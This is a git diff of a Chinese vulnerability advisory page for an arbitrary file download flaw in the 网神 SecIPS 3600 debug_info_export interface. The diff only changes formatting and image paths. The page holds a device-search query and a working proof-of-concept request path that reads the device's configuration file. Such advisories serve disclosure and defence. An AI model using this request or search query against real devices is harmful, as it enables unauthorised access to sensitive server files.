@@ -1,8 +1,8 @@
-# 网神 SecIPS 3600 debug_info_export 任意文件下载漏洞
+# 网神 SecIPS 3600 debug\_info\_export 任意文件下载漏洞
 
 ## 漏洞描述
 
-网神 SecIPS 3600 debug_info_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件
+网神 SecIPS 3600 debug\_info\_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件
 
 ## 漏洞影响
 
@@ -20,7 +20,7 @@ app="网神-SecIPS"
 
 登录页面
 
-![image-20230314090018282](images/image-20230314090018282.png)
+![image-20230314090018282](../.gitbook/assets/image-20230314090018282.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="网神-SecIPS"
 /webui/debug/debug_info_export?filename=default.cfg
 ```
 
-![image-20230314090033658](images/image-20230314090033658.png)
+![image-20230314090033658](../.gitbook/assets/image-20230314090033658.png)
